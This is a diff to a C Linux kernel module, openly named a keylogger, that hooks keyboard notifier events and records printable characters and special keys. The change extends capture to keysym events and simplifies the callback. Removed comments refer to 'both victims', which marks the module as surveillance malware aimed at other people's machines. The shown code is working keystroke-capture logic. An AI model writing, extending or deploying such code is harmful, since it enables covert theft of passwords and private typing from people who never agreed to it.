@@ -70,12 +70,12 @@ static void append_token(const char *token)
     }
 }
 
-static void log_unicode_char(unsigned int ch)
+static void log_printable(unsigned int v)
 {
-    char c = (char)ch;
+    char c = (char)v;
 
     // ASCII space to ~
-    if ((c >= 0x20 && c <= 0x7E))
+    if (c >= 0x20 && c <= 0x7E)
     {
         append_char(c);
     }
@@ -120,41 +120,6 @@ static void log_special_key(unsigned int keycode)
     }
 }
 
-// static void log_keysym(unsigned int sym)
-// {
-//     // Backspace on both victims
-//     if (sym == 0xF008) 
-//     {
-//         append_token("[BS]");
-//         return;
-//     }
-
-
-//     // Enter on both victims
-//     if (sym == 0xF201) 
-//     {
-//         append_char('\n');
-//         return;
-//     }
-
-
-//     //  Delete (different codes on different victims)
-//     if (sym == 0xF07F || sym == 0xF702) 
-//     {
-//         append_token("[DEL]");
-//         return;
-//     }
-
-
-//     char c = (char)sym;
-
-
-//     if (c >= 0x20 && c <= 0x7E) 
-//     {
-//         append_char(c);
-//     }
-// }
-
 static int keylogger_cb(struct notifier_block *nblock, unsigned long code, void *_param)
 {
     struct keyboard_notifier_param *param = _param; // Cast the generic void pointer to the keyboard parameter struct
@@ -164,22 +129,19 @@ static int keylogger_cb(struct notifier_block *nblock, unsigned long code, void 
         return NOTIFY_OK;
     }
 
-    // KBD_UNICODE for text, KBD_KEYCODE for special keys
-    if (code == KBD_UNICODE) 
+    switch (code)
     {
-        log_unicode_char(param->value); // text
-    } 
-    else if (code == KBD_KEYCODE)
-    {
-        log_special_key(param->value); // actions
+        case KBD_KEYCODE:
+            log_special_key(param->value); // actions
+            break;
+
+        case KBD_UNICODE:
+        case KBD_KEYSYM:
+            log_printable(param->value); // text: uses same logic for both
+            break;
     }
-    // else if (code == KBD_KEYSYM)
-    // {
-    //     log_keysym(param->value); // actions with keysyms
-    // }
 
-
-    return NOTIFY_OK; 
+    return NOTIFY_OK;
 }
 
 static struct notifier_block keylogger_nb =
